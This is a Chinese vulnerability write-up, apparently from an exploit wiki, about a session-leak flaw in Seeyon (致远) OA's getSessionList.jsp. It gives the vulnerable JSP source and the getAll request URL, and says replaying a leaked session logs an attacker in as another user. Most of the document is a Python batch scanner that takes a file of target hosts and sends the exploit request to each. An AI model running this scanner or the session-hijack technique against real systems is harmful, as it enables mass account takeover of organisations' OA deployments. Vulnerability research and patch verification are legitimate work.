# 致远OA getSessionList.jsp Session泄漏漏洞

## 漏洞描述

通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况

## 影响版本

> [!NOTE]
>
> 未知

## 漏洞复现

源码

```jsp
<%@ page contentType="text/html;charset=GBK"%>
<%@ page session= "false" %>
<%@ page import="net.btdz.oa.ext.https.*"%>
<%
    String reqType = request.getParameter("cmd");
    String outXML = "";
    boolean allowHttps = true;
    if("allowHttps".equalsIgnoreCase(reqType)){
        //add code to judge whether it allow https or not
        allowHttps = FetchSessionList.checkHttps();
        if (allowHttps) response.setHeader("AllowHttps","1");
    }
    if("getAll".equalsIgnoreCase(reqType)){
        outXML = FetchSessionList.getXMLAll();
    }
    else if("getSingle".equalsIgnoreCase(reqType)){
        String sessionId = request.getParameter("ssid");
        if(sessionId != null){
            outXML = FetchSessionList.getXMLBySessionId(sessionId);
        }
    }
    else{
        outXML += "<?xml version=\"1.0\" encoding=\"GB2312\"?>\r\n";
        outXML += "<SessionList>\r\n";
//        outXML += "<Session>\r\n";
//        outXML += "</Session>\r\n";
        outXML += "</SessionList>\r\n";
    }
    out.println(outXML);
%>
```

从上面的代码可知，当cmd参数为getAll时，便可获取到所有用户的SessionID ,请求 

```
http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

回显Session则存在漏洞

![](http://wikioss.peiqi.tech/vuln/zhiyuan-21.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

通过替换 Session即可登陆系统

## 漏洞利用POC

```python
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 致远OA A6                                              \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         >>> ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "/yyoa/index.jsp" not in response.text and "<sessionID>" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞,Session地址:{} \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m")

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m")
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    Scan(file_name)
```

![](http://wikioss.peiqi.tech/vuln/zhiyuan-22.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)